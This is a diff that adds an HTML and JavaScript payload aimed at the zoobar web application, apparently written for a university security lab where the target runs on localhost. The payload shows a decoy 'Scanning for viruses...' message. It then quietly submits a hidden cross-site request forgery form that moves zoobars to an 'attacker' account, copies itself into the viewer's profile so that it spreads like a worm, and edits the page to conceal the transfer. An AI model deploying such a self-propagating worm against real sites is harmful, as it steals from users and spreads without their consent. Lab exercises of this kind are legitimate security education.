@@ -1,0 +1,30 @@
+Scanning for viruses...
+<iframe width="0" height="0" id="iframe" style="display: none" name="iframe">
+</iframe>
+<div style="display: none" id="idiv">
+  <form style="display: none" method="post" id="csfr"
+        action="http://localhost:8080/zoobar/index.cgi/transfer"
+  target="iframe" >
+    <input style="display: none" type="hidden" name="zoobars" value="1" />
+    <input style="display: none" type="hidden" name="recipient" value="attacker" />
+    <input style="display: none"  type="submit" />
+  </form>
+</div>
+<span id="zoobars" class="10"></span>
+<script type="text/javascript">
+  document.getElementById("csfr").submit();
+  var xmlHttp;
+  xmlHttp = new XMLHttpRequest();
+  var url = "/zoobar/index.cgi";
+  xmlHttp.open("POST", url, false);
+  content=new FormData();
+  profile=document.getElementsByTagName('b')[1].innerHTML
+  content.append('profile_update', profile);
+  content.append("profile_submit", 'Save');
+  xmlHttp.send(content);
+
+  setTimeout(function(){
+  tbody=document.getElementsByTagName('tbody')[1]
+  tr=tbody.childNodes[0];
+  tbody.innerHTML=tr.innerHTML;}, 100);
+</script>
